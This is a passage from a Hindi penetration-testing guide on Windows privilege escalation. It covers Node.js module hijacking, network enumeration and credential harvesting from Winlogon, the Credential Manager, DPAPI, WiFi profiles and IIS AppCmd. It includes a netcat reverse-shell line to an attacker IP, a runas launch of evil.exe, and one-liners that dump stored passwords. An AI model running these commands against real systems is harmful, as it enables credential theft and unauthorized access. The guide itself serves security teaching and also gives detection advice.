अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) डाल सकता है और **higher-privileged Node/Electron process** द्वारा missing dependency को resolve करने की प्रतीक्षा कर सकता है। Payload, victim process के security context में execute होता है, इसलिए जब भी target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app से चलता है, तो यह **LPE** बन जाता है।

यह खास तौर पर इन स्थितियों में आम है:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
- कोई third-party library, `require("foo")` को `try/catch` में लपेटे और failure होने पर भी आगे बढ़े
- production builds से कोई package हटा दिया गया हो, packaging के दौरान शामिल न किया गया हो, या install न हो पाया हो
- vulnerable `require()` मुख्य application code के बजाय dependency tree में गहराई में हो

### Vulnerable targets की खोज

Resolution path की पुष्टि करने के लिए **Procmon** का उपयोग करें:<sup>[[23]](#references)</sup>

- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` को `node_modules` `contains` पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत अंतिम सफल open पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **missing package name** पहचानें।
2. अगर root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. अपेक्षित सटीक नाम वाला module डालें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application को ट्रिगर करें। अगर application `require("foo")` करने की कोशिश करती है और वैध module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस पैटर्न में आने वाले अनुपलब्ध optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन इसका **तकनीक** वाला हिस्सा दोबारा इस्तेमाल किया जा सकता है: ऐसा कोई भी **missing bare import** खोजें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के सुझाव

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- ऐसे high-integrity processes खोजें जो `C:\node_modules\*` से पढ़ रहे हों।
- Production में सभी runtime dependencies package करें और `optionalDependencies` के उपयोग का audit करें।
- Third-party code में ऐसे silent `try { require("...") } catch {}` patterns की समीक्षा करें।
- अगर library इसका समर्थन करती है, तो optional probes बंद करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के ज़रिए legacy `utf-8-validate` probe से बच सकते हैं)।

## नेटवर्क

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें.

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

स्थानीय listener के लिए, उसके PID को process owner, executable path, और उसे शुरू करने वाली किसी service या scheduled task से जोड़कर देखें। Remote-control service, desktop user के रूप में access तभी दे सकती है, जब उसका authentication और command control इसकी अनुमति दें। अधिक privileges वाले account के तहत चलने वाला custom TCP application, समीक्षा का अलग लक्ष्य है: listener और binary path केवल शुरुआती सुराग हैं, जबकि authenticated memory-corruption route के लिए उसी binary और उसके reachable input का विश्लेषण आवश्यक है। अगर कोई खुला port system process का लगता है, तो backend service की पहचान करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule होने से यह साबित नहीं होता कि destination reachable या vulnerable है।

### रूटिंग टेबल

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP तालिका

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Rules

[**Firewall से संबंधित commands के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(rules की सूची देखें, rules बनाएँ, बंद करें, बंद करें...)**

[Network enumeration के लिए और commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

अगर आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का इस्तेमाल करेंगे, तो GUI के ज़रिए पूछा जाएगा कि क्या `nc` को firewall से अनुमति दी जानी चाहिए)।

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में `WSL` फ़ाइल सिस्टम देख सकते हैं।

WSL के भीतर Linux `root` होने से अपने-आप Windows Administrator अधिकार नहीं मिलते। यदि मौजूदा Windows पहचान किसी distribution के फ़ाइल सिस्टम को पढ़ सकती है, तो shell-history फ़ाइलें (जिनमें `/root/.bash_history` भी शामिल है) देखें कि कहीं उनमें ऐसे commands तो दर्ज नहीं हैं जिनसे credentials का पता चल सकता हो; privilege escalation के लिए फिर भी किसी मान्य उच्च-विशेषाधिकार वाले account और अनुमत authentication path की आवश्यकता होती है। `LocalState\rootfs` लेआउट पुराने WSL installations पर लागू होता है; WSL 2 में distribution आमतौर पर [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में संग्रहित होती है, इसलिए पहले वास्तविक distribution और storage path की पहचान करें। स्वचालित enumeration के दौरान history की सामग्री दिखाने से बचें।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को credentials के बजाय account context मानें। गैर-खाली `DefaultPassword` या `AltDefaultPassword` value, registry में plaintext finding है। अगर `AutoAdminLogon=1` है लेकिन plaintext password पढ़ा नहीं जा सकता, तो यह केवल एक lead है: [Sysinternals Autologon password को LSA secret के रूप में स्टोर कर सकता है](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह साबित नहीं होता कि वह secret मौजूद है या उसे retrieve किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की समीक्षा करें।

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> से\
Windows Vault, servers, websites और अन्य programs के लिए user credentials स्टोर करता है, जिनका उपयोग **Windows** **users को अपने-आप log in करने** के लिए कर सकता है। पहली नज़र में ऐसा लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials स्टोर कर सकते हैं और browsers को अपने-आप log in करवा सकते हैं, लेकिन यह ऐसे काम नहीं करता।

Windows Vault ऐसे credentials स्टोर करता है जिनका उपयोग Windows users को अपने-आप log in करने के लिए कर सकता है। इसका मतलब है कि कोई भी **Windows application जिसे किसी resource** (server या website) **तक पहुँचने के लिए credentials की ज़रूरत हो**, इस Credential Manager और Windows Vault का उपयोग कर सकती है और users के हर बार username और password दर्ज करने के बजाय दिए गए credentials इस्तेमाल कर सकती है।

जब तक applications, Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के credentials का उपयोग कर सकती हैं। इसलिए, अगर आपकी application vault का उपयोग करना चाहती है, तो उसे किसी तरह **credential manager से communicate करके default storage vault से उस resource के credentials माँगने चाहिए**।

मशीन पर स्टोर किए गए credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

इसके बाद, सहेजे गए credentials का उपयोग करने के लिए आप `runas` को `/savecred` options के साथ इस्तेमाल कर सकते हैं। निम्नलिखित उदाहरण में SMB share के ज़रिए एक remote binary को कॉल किया जा रहा है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

दिए गए क्रेडेंशियल्स के सेट के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services, authentication tokens और plaintext passwords को Universal Windows Platform (UWP) के `PasswordVault` में संग्रहित करते हैं (यह `vaultcmd` में `Web Credentials` के रूप में भी उपलब्ध है)। यह storage space session-isolated होता है और इसे administrative या `SeDebugPrivilege` अधिकारों के बिना native रूप से decrypt किया जा सकता है।

संग्रहित सभी usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, उपयोगकर्ता के सक्रिय session में यह PowerShell command चलाएँ:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है। इसका उपयोग मुख्यतः Windows operating system में asymmetric private keys के symmetric encryption के लिए किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग करता है।

**DPAPI, user के login secrets से प्राप्त symmetric key के ज़रिए keys को encrypt करने की सुविधा देता है**। System encryption वाले मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypt की गई user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में store की जाती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, उसी file में user की private keys को सुरक्षित रखने वाली master key के साथ रखी जाती है** और आमतौर पर इसमें 64 bytes का random data होता है। (ध्यान दें कि इस directory तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` command से इसकी सामग्री की listing नहीं की जा सकती, लेकिन PowerShell के ज़रिए listing की जा सकती है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए सही arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password** से सुरक्षित **credentials files** आमतौर पर यहाँ मौजूद होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप उपयुक्त `/masterkey` के साथ `mimikatz` module `dpapi::cred` का उपयोग करके decrypt कर सकते हैं।\
यदि आपके पास root access है, तो `sekurlsa::dpapi` module से **memory** में मौजूद कई DPAPI **masterkeys** **extract** कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल्स

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks में encrypted credentials को सुविधाजनक रूप से store करने के लिए किया जाता है। ये credentials **DPAPI** से सुरक्षित होते हैं, जिसका आमतौर पर अर्थ है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypt किया जा सकता है जिस पर इन्हें बनाया गया था।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory इसका संकेत दे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory पता करें: [Windows profiles को अन्य स्थानों पर रख सकता है](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। ऐसी file को पढ़ पाना केवल एक सुराग है; [Windows का `Export-Clixml` encrypted credential को export करने वाले user और computer से बाँधता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और किसी भी recovered account के पास लक्षित service के लिए अलग से valid rights होने चाहिए। Routine enumeration के दौरान encrypted या plaintext values print किए बिना पहले paths और ACLs की जाँच करें।

फ़ाइल में मौजूद PS credentials को **decrypt** करने के लिए यह करें:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers` में पा सकते हैं।

### हाल ही में चलाए गए कमांड

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` module का उपयोग उचित `/masterkey` के साथ **किसी भी .rdg फ़ाइल को decrypt करने** के लिए करें\
आप Mimikatz `sekurlsa::dpapi` module से memory से **कई DPAPI masterkeys extract कर सकते हैं**

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और user Documents में पढ़े जा सकने वाले XML का निरीक्षण करें, जिनमें `config.xml` जैसे सामान्य नाम वाली फ़ाइलें भी शामिल हैं। XML फ़ाइल को credential lead मानने से पहले connection schema और encrypted `Password` attributes की पहचान करें। संग्रहित value, DPAPI/RDCMan password नहीं है; इसे recover करना फ़ाइल की encryption settings और इस बात पर निर्भर करता है कि custom master password का उपयोग किया गया था या नहीं। व्यापक enumeration के दौरान encrypted values को प्रिंट करने से बचें।

**Remote Desktop Plus profile exports** user directories या shared administration folder में पढ़े जा सकने वाले रूप में भी मिल सकते हैं। पुराने `profiles.xml` export में `ProfileName`, `Password` और `Secure` elements वाली `Data/Profile` entries होती हैं। गैर-खाली password element को credential lead मानें, लेकिन उसे प्रिंट न करें या plaintext न मानें: [vendor के अनुसार](https://www.donkz.nl/), profile protection बनाने वाले account और computer से बंधी हो सकती है, या इसे कम सख्ती से configure किया जा सकता है। इस पर भरोसा करने से पहले फ़ाइल के स्रोत और उसे recover करने की शर्तों की पुष्टि करें।

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **passwords** और अन्य जानकारी **सहेजने** के लिए करते हैं, और उन्हें पता नहीं होता कि यह एक database file है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में मौजूद होती है और इसे खोजना तथा जाँचना हमेशा उपयोगी होता है।

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी सहेजते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में संग्रहित करता है; पुराने या अलग apps अन्य user-profile stores, जैसे LevelDB, का उपयोग कर सकते हैं। SQLite फ़ाइल न मिलने का अर्थ यह मानने से पहले कि notes मौजूद नहीं हैं, installed app और storage format की पहचान करें।

अगर Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में commit किए गए notes छूट सकते हैं। database की सुसंगत copy के साथ matching `plum.sqlite-wal` भी रखें, और उपलब्ध होने पर `plum.sqlite-shm` शामिल करें; shared-memory index को फिर से बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। किसी account name या password वाले note को केवल credential lead मानें: account, अनुमत access और password reuse की अलग से पुष्टि करें। Encrypted password-manager record से higher-privilege login की पुष्टि करने के लिए उसकी वास्तविक decryption key और application-specific interpretation भी आवश्यक है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना और High Integrity level के अंतर्गत चलाना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में मौजूद है।\
अगर यह फ़ाइल मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
Installers को **SYSTEM privileges के साथ चलाया जाता है**, और उनमें से कई **DLL Sideloading के प्रति vulnerable हैं (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Support-tool registry credential artifacts

कुछ पुराने remote-support installations, fixed application registry keys के अंतर्गत password-संबंधी value names बनाए रखते हैं। उदाहरण के लिए, [vendor की registry-key व्याख्या](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer का `SecurityPasswordAES` version 9 से पहले configured static session password की पहचान करता था। Value-name marker केवल जाँच का संकेत है: उस credential का आकलन करने से पहले installed version, readable value data, format और मौजूदा authentication behavior की पुष्टि करें। Remote-support password से किसी अधिक privileged Windows account तक पहुँचने के लिए उस account में password का वास्तव में reuse होना और उसके लिए authorization होना भी आवश्यक है। नियमित enumeration output में ciphertext और recovered passwords न दिखाएँ।

### Protected sheets वाली shared spreadsheets

यदि संदेह हो कि किसी readable shared workbook में account data है, तो **file encryption** और worksheet protection या hidden columns के बीच अंतर करें। [Microsoft बताता है](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) कि worksheet protection editing को नियंत्रित करता है और security feature नहीं है; इससे अपने-आप यह साबित नहीं होता कि workbook का content encrypted है। केवल अधिकृत और प्रासंगिक files की जाँच करें और व्यापक enumeration के दौरान संभावित secrets को print करने से बचें। केवल readable `.xlsx` path, protected sheet या hidden column से यह साबित नहीं होता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights की अलग से पुष्टि करें।

### CI server में रखे गए change patches

CI server, build पूरा होने के बाद भी अपने data directory में जमा किए गए source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` को remote-run changes के storage के रूप में बताते हैं; data directory को configure किया जा सकता है और यह ज़रूरी नहीं कि `ProgramData` के अंतर्गत हो। किसी readable patch में credential file, encryption key या दोनों का उपयोग करने वाली script के हटाए गए या जोड़े गए references सुरक्षित रह सकते हैं। उदाहरण के लिए, PowerShell का `ConvertTo-SecureString -Key` workflow, AES key के साथ encrypted string भी माँगता है; [Microsoft बताता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) कि key अलग से दी जाती है। पहले केवल accessible patch names की जाँच करें, फिर authorization के अंतर्गत प्रासंगिक content देखें—नियमित enumeration output में secrets न दिखाएँ। केवल patch path, encrypted value या key reference से valid credential या higher-privilege access साबित नहीं होता। Data-directory ACLs सीमित रखें और build changes में secrets commit करने से बचें।

### Custom local administrator password rotation

घर में बनाया गया password rotator, encrypted local administrator password को local service में रख सकता है, जबकि उसके datastore credentials readable `.env` file में या updater binary के पास रखे जा सकते हैं। Updater के scheduled task, account, configuration ACLs, listener और datastore permissions की एक साथ जाँच करें। केवल loopback पर उपलब्ध datastore तक भी ऐसा local user पहुँच सकता है जिसके पास valid credentials हों, लेकिन authentication से यह साबित नहीं होता कि उसे प्रासंगिक records पढ़ने की permission है। यदि encryption seed या key material ciphertext के पास उपलब्ध है, तो encryption पर भरोसा करने से पहले सटीक key derivation की जाँच करें। Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके exposed seed से deterministically AES key बनाने वाली scheme, उस password को सुरक्षित रखने के लिए अनुपयुक्त है; Go के दस्तावेज़ इस package को security-sensitive randomness के लिए अनुपयुक्त बताते हैं। Recovered password को escalation path मानने से पहले पुष्टि करें कि वह अभी भी valid है और local Administrators-group account का है। Scheduled task, `.env` path या encrypted blob—इनमें से कोई भी चीज़ अकेले इन शर्तों को साबित नहीं करती। नियमित enumeration output में passwords और key material न दिखाएँ।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-backed storage और access controls, custom local datastore से अलग हैं; इसी तरह, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) तय करते हैं कि authenticated datastore user किसी specific index को पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। किसी readable custom plugin में embedded service credential वाला configuration या bytecode हो सकता है। Archive की जाँच केवल authorization होने पर करें और recovered secrets को नियमित enumeration output में न दिखाएँ। केवल plugin path से यह साबित नहीं होता कि कोई secret मौजूद है; और recovered service password से higher privileges तभी मिलते हैं, जब वह किसी अधिक privileged account के लिए भी valid हो। संबंधित file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle का JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account इसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property की एक साथ जाँच करें। Openfire के [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में या उस property में रखी key से encrypted रूप में stored हो सकते हैं। Recovered password से escalation तभी संभव है, जब वह किसी अधिक privileged identity के लिए अभी भी valid हो; केवल file name से read access या credential reuse में से कुछ भी साबित नहीं होता। यह path केवल inventory का संकेत है, इसलिए database content और credentials को नियमित enumeration output में न दिखाएँ।

अलग `Openfire\conf\openfire.xml` file, external database इस्तेमाल होने पर भी, admin console के configured ports और bind interface का खुलासा कर सकती है। Openfire आमतौर पर अपने admin console को loopback पर bind करता है; listener चल रहा हो तो local account फिर भी उस address तक पहुँच सकता है। Actual listener, authorized admin role, plugin-upload policy और Openfire service identity की एक साथ जाँच करें। Plugin install कर सकने वाला admin, plugin code को service के context में चला सकता है; यदि service LocalSystem के रूप में चलती है, तो यह context अत्यधिक privileged हो सकता है। Matching account password या readable configuration path अकेले admin-console access या code execution साबित नहीं करता। Vendor की [installation और plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिनका नाम आमतौर पर `server.config.yaml` होता है, internal CA की `CA.private_key` रख सकते हैं। यदि कम privileged user उस key को पढ़ सकता है, तो वह API client certificate बना सकता है। इससे higher privileges मिलेंगे या नहीं, यह server के user roles, API की reachability और server या target agent जिस identity के अंतर्गत execute होता है, उन पर निर्भर करता है। Client configuration में अलग material होता है; उसे ढूँढ़ने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए readable server configuration में signing key न भी हो सकती है।

Windows server पर, installation directory और किसी भी protected backup copy में **server** configuration के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; यदि service का configured path अलग है, तो उसी का उपयोग करें। पुष्टि करें कि मौजूदा identity file पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Private key को logs या enumeration output में न दिखाएँ। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन server-side प्रभावी role भी आवश्यक है; ऐसा role बनाना या बदलना datastore write access या restart माँग सकता है। जब ये writes उपलब्ध न हों, तब भी कोई मौजूदा privileged server identity रास्ता दे सकती है। Execution rights वाली API queries संबंधित server या agent context में चलती हैं, जो अत्यधिक privileged हो सकता है।

Server configuration और backups को restrictive ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key offline रखें, और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty Creds

```bash
